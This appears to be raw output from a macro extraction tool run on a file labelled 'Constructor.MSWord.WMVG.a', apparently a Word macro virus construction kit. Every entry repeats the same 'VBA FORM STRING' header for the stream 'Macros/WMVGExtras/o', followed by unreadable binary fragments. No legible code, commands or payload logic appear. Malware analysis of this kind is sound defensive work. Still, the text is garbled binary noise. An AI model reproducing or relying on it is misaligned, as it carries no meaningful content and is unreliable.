VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��2���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���#B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rbr�3$4C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S%�c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�5�D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'dtU7��()��󄔤�����eu��������FVfv��������GWgw��������8HXhx��������9IYiy��������*:JZjz����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�)]��JD�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z���	۸86fR��:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N�K���!��m�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|�ˎ��1<]�%�ӥ�]D�� � r�:���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)@X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ɏ�'�pH 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��n��b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�L9��koT�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
iVsA��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�)}2�bx�x֘	M%:ݝ�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VVH�3Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ƹ�����y�RY�)+p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B���%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j1���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0\��n�m�5��V/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1��Uڃ,��5E������r�Ѭm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*Z�w�K5�Eŧ��3I_Rw�)�|[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a��i;��Ӵ�	Rc�F�jj��2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d�3|�t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=�џ�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���d:�SM�K��I��i8���k�|�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B��:r[�h9F����VB�����;e�@��t^���`$���(��sN,��2zc�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&1�k�[m.�9����F�	c��5yKY>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}���&��PWq�s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�T�[�vɂ��e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|�B��}o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
oc|Iӧ5f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C'E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_�L�B.�@�G�u9O#,k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Vo���y#�Ux����$%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u��Ƭ�O#Ghޣ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ITV�ZB8/,Uf�ke
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�
#�N�#F̵dfJ+2�*���4ԲG����F\�FU��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l}?���HU��l.��n'��q!�cF@#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2����h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
��~���7��T-p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z)1��,d�ͤ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���3��9
�n ��^8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4g��Ɨ0IN�^��$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�[CVNR7�b*�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�	UU#�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P˴�)ݼ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\H�4$�2 �������2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�#�%����M��⾚�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P��9Q��E:�����e,bZ�@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q~Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
eJw6��O�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	���ZWl�B��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v>�*T��(M6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*P�c��GP=��2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��>
(�O�aUt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b+ܜ�SHmğ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��t�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��SD;�cj���V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�{a�R%�!@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S}��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�z��
����"���!;��ɠ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
껊��^W+��Cj)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AH?	_�L�-��fZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$8TtQp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N��a��j$d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~x�k�[	$���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
({u5�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ٌ#�[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q	hS�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���^9�ݜ�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�c�UM8��@=��CXW�Ҧg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D1��Ҟ��3	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ҩ̦���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�csmB�K�N��$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9 ����Gѓ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ly��?t�Ǣ ���1�����Pt�\��>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
UP�o|�HWAS�)u혹��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H�2�jC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sy�&�֬Aw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R����9b�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W���;�ims
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�����Kw��0ᰑ����dH��fvJ|1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w߾W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���>���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m���T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�͇����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E܁jsJ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��A'吘�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mwqq7&�ۀYR�TW��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Stj�SJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�b
H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ӑj���d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}�CB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�W��G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɵ��Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�N�'{n�HQ@��Eȳ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h��-X��c���M���S�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�iR���RA ��UT���@�ܶG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[-���9�*�~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�Ubէt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;��~��Drj�+�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��xG$���4�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?�l�e|���h{�x
����.�;,F�!ijP��I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#i*-e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��H����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4�����2��x�X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

/�[��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
듁`Ps�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����L�1��n	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����z�dŤ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U���ܕ{v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&$CY�g˖LC-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!����yo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ECP�]���[�xC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����$

-------------------------------------------------------------------------------
